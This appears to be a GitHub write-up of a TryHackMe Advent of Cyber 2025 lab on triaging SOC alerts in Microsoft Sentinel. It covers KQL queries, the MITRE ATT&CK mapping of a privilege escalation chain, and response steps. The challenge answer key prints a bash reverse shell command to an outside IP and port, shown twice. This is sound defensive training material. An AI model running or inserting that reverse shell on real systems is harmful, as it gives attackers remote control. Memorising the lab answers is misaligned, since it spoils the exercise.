# 🎄 Advent of Cyber 2025 - Day 10: SOC Alert Triaging - Tinsel Triage

[![TryHackMe](https://img.shields.io/badge/TryHackMe-Advent%20of%20Cyber%202025-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)](https://tryhackme.com)
[![Duration](https://img.shields.io/badge/Duration-45%20min-blue?style=for-the-badge)](https://tryhackme.com)
[![SIEM](https://img.shields.io/badge/Platform-Microsoft%20Sentinel-0078D4?style=for-the-badge)](https://azure.microsoft.com/en-us/services/microsoft-sentinel/)

## 📖 Overview

Day 10 introduces SOC alert triaging using Microsoft Sentinel. Learn systematic approaches to prioritize security alerts, correlate incidents, and investigate using KQL in a real cloud SIEM environment.

### 🎯 Learning Objectives

- Master alert triage methodology
- Navigate Microsoft Sentinel for incident investigation
- Write KQL queries for log analysis
- Correlate alerts to identify attack chains
- Determine alert verdicts (TP/FP/Benign)

## 🔍 Investigation Summary

**Threat Actor:** Evil Easter Bunnies  
**Target:** TBFC Azure Environment  
**Attack Type:** Coordinated privilege escalation  
**Detection Platform:** Microsoft Sentinel  
**Investigation Method:** Systematic alert triage + KQL analysis  

## 🎯 The Triage Framework

### Four Essential Dimensions

| Factor | Question | Purpose |
|--------|----------|---------|
| **Severity** | How bad? | Urgency assessment |
| **Timestamp** | When? | Identify ongoing attacks |
| **Attack Stage** | Where in lifecycle? | Understand attacker progress |
| **Affected Asset** | Who/what? | Prioritize by criticality |

### Investigation Workflow

```
1. Investigate alert details
2. Check related logs
3. Correlate multiple alerts
4. Build context & timeline
5. Decide next action
6. Document findings
```

## 📝 Lab Setup

### Access Requirements

**Note**: Lab provides temporary Azure credentials via TryHackMe. Follow connection card for specific details.

### Deployment Steps

1. Click "Cloud Details" in TryHackMe
2. Select "Join Lab"
3. Wait 2-3 minutes
4. Click "Deploy Lab" from Actions tab
5. Wait 2-3 minutes
6. Click "Deploy Rules"
7. Copy Lab URL and open in new tab
8. Use provided credentials to sign in

**Important**: Lab expires after 1 hour. Full deployment: 4-5 minutes.

### Environment Preparation

**Step 1: Verify Log Ingestion**
```
1. Azure Portal → Search "Microsoft Sentinel"
2. Select your Sentinel instance
3. Go to Logs tab
4. Select: Syslog_CL
5. Run query
6. Wait for logs (refresh if needed)
```

**Step 2: Enable Detection Rules**
```
1. Configuration → Analytics
2. Select all active rules
3. Click Disable
4. Wait for confirmation
5. Select all again
6. Click Enable
7. Confirm success
```

**Why**: Forces rules to re-trigger with fresh incidents.

## 🔬 Complete Investigation

### Phase 1: Incident Overview

**Navigate to Incidents:**
```
Threat management → Incidents → << (expand view)
```

**What You'll See:**
- Multiple severity levels (High, Medium, Low)
- Various MITRE ATT&CK tactics
- Different affected entities

**Priority**: Start with High-severity incidents

### Phase 2: Alert Correlation

**Example High-Severity Alert**: Linux PrivEsc—Kernel Module Insertion

**Initial Details:**
- Events: 3 related
- Entities: 3 involved (host, user, process)
- Tactic: Privilege Escalation

**Actions:**
```
1. Click alert
2. Review summary panel
3. Click "View full details"
4. Check Incident Timeline
5. Review Similar Incidents
6. Examine Evidence
```

**Key Insight**: Multiple alerts to same entities = coordinated attack, not isolated incidents

**Example Correlation:**

| Alert | Stage | Timing |
|-------|-------|--------|
| Root SSH from External IP | Initial Access | T+0 |
| SUID Discovery | Privilege Escalation | T+5min |
| Kernel Module Insertion | Persistence | T+8min |

**Analysis**: Three stages of same attack chain.

### Phase 3: Deep Log Analysis with KQL

**Accessing Raw Events:**
```
Full details → Evidence → Events
```

**Switching to KQL Mode:**
```
Simple mode dropdown → KQL mode
```

**Investigation Query Template:**
```kql
set query_now = datetime(2025-10-30T05:09:25.9886229Z);
Syslog_CL
| where host_s == 'TARGET_HOST'
| project _timestamp_t, host_s, Message
```

**What This Reveals**: Full event context around incidents

**Example Output:**
```
1. cp command (shadow file backup)
2. User added to sudoers
3. Account modification by root
4. Kernel module insertion
5. SSH authentication as root
```

**Verdict**: Coordinated privilege escalation attack

## 🏆 Challenge Answers

### Task 5: Diving Deeper Into Logs

| Question | Answer |
|----------|--------|
| Kernel module installed in websrv-01 | `malicious_mod.ko` |
| Unusual command executed by ops user in websrv-01 | `/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1` |
| First SSH source IP to storage-01 | `172.16.0.12` |
| External root login source IP to app-01 | `203.0.113.45` |
| User added to sudoers in app-01 (aside from backup) | `deploy` |

### Task 4: Investigation Proper

| Question | Answer |
|----------|--------|
| Entities affected by Linux PrivEsc - Polkit Exploit Attempt alert | `10` |
| Severity of Linux PrivEsc - Sudo Shadow Access alert | `High` |
| Accounts added to sudoers group in Linux PrivEsc - User Added to Sudo Group alert | `4` |

### Answer Analysis

**Reverse Shell Command**: `/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1`
- This is a bash TCP reverse shell
- Redirects interactive bash to attacker IP `198.51.100.22` on port `4444`
- Classic post-exploitation technique

**Internal vs External IPs**:
- `172.16.0.12` (storage-01): Internal network, suggests lateral movement
- `203.0.113.45` (app-01): External IP, direct external compromise

## 🛠️ KQL Query Reference

### Basic Structure
```kql
TableName
| where field_name == 'value'
| project column1, column2, column3
```

### Common Operators

| Operator | Purpose | Example |
|----------|---------|---------|
| `where` | Filter rows | `where host_s == 'app-01'` |
| `project` | Select columns | `project _timestamp_t, Message` |
| `contains` | Text search | `Message contains 'ssh'` |
| `order by` | Sort results | `order by _timestamp_t asc` |
| `take` | Limit results | `take 10` |
| `!contains` | Exclude text | `Message !contains '127.0.0.1'` |

### Advanced Patterns

**Time-based filtering:**
```kql
| where _timestamp_t between (datetime(2025-10-30T05:00:00Z) .. datetime(2025-10-30T06:00:00Z))
```

**Multiple conditions:**
```kql
| where (user_s == 'root' or user_s == 'admin') and host_s == 'app-01'
```

**Aggregation:**
```kql
| summarize count() by host_s, user_s
```

## 🎯 Attack Analysis

### Identified Attack Chain

**Stage 1: Initial Access**
```
External SSH login to application servers
Source: External IP
Method: Password/key authentication
Tactic: Initial Access (T1078)
```

**Stage 2: Privilege Escalation**
```
SUID discovery commands
Shadow file backup
Sudoers group modifications
Tactic: Privilege Escalation (T1548, T1078)
```

**Stage 3: Persistence**
```
Kernel module insertion
Root access establishment
Tactic: Persistence (T1547.006)
```

**Stage 4: Credential Access**
```
Shadow file exfiltration
User account manipulation
Tactic: Credential Access (T1003)
```

### IOCs Identified

**Network:**
- External IP addresses accessing systems as root
- Unusual SSH login patterns
- Non-standard login times

**Host:**
- Malicious kernel modules installed
- Unauthorized sudoers modifications
- Shadow file access/backup
- SUID binary enumeration

**User:**
- New accounts added to privileged groups
- Account modifications by unexpected users
- Root access from external sources

## 📊 MITRE ATT&CK Mapping

| Technique | ID | Alert Example |
|-----------|----|----|
| Valid Accounts | T1078 | Root SSH from External IP |
| Abuse Elevation Control | T1548 | SUID Discovery |
| Boot/Logon Autostart | T1547.006 | Kernel Module Insertion |
| OS Credential Dumping | T1003 | Shadow File Access |

## 🛡️ Detection & Response

### Alert Triage Decision Tree

```
High Severity?
├─ Yes → Investigate immediately
└─ No → Check context
    ├─ Multiple related alerts?
    │   ├─ Yes → Correlate & investigate
    │   └─ No → Queue for review
    └─ Critical asset?
        ├─ Yes → Escalate
        └─ No → Standard investigation
```

### Incident Response Actions

**For True Positives:**
```
1. Isolate affected systems
2. Preserve evidence (logs, memory)
3. Revoke compromised credentials
4. Remove persistence mechanisms
5. Escalate to IR team
6. Document timeline
```

**For False Positives:**
```
1. Document reason for FP
2. Update detection rules
3. Suppress similar alerts
4. Tune alert threshold
```

## 📚 Key Concepts

### Alert Verdict Types

**True Positive (TP)**
- Real malicious activity
- Requires immediate response
- Example: Unauthorized root access + privilege escalation

**False Positive (FP)**
- Benign activity incorrectly flagged
- Requires rule tuning
- Example: Authorized admin activity flagged as suspicious

**Benign True Positive**
- Detection correct but activity authorized
- Requires documentation
- Example: Authorized penetration test

### Correlation Importance

**Single Alert**: Might be noise  
**Correlated Alerts**: Reveals attack campaign

**Example:**
```
Individual: SSH login (could be legitimate)
Correlated: SSH → SUID discovery → kernel module → root access
Verdict: Clear privilege escalation attack
```

## 🎓 Learning Outcomes

### Triage Skills

✅ Systematic prioritization methodology  
✅ Severity-based decision making  
✅ Temporal correlation analysis  
✅ Attack stage identification  
✅ Asset-based risk assessment  

### Technical Skills

✅ Microsoft Sentinel navigation  
✅ KQL query writing  
✅ Log correlation across sources  
✅ Timeline reconstruction  
✅ Entity relationship mapping  

### Analyst Mindset

✅ Think in attack chains, not isolated events  
✅ Context over individual alerts  
✅ Systematic > reactive  
✅ Documentation as investigation progresses  
✅ Continuous improvement of detection rules  

## 🔗 Related Resources

### TryHackMe Rooms
- [Microsoft Sentinel](https://tryhackme.com) - Deep dive
- [Splunk](https://tryhackme.com) - Alternative SIEM
- [Incident Response](https://tryhackme.com) - Complete IR workflow

### External Resources
- [Microsoft Sentinel Documentation](https://docs.microsoft.com/en-us/azure/sentinel/)
- [KQL Reference](https://docs.microsoft.com/en-us/azure/data-explorer/kusto/query/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)

## 🤝 Contributing

Improvements welcome! Open a PR.

## 📜 License

Educational purposes only. All credit to TryHackMe and Advent of Cyber 2025.

---

⭐ **Found this helpful? Star the repo!**

🚨 **Day 10/25 Complete - Triage systematically!**
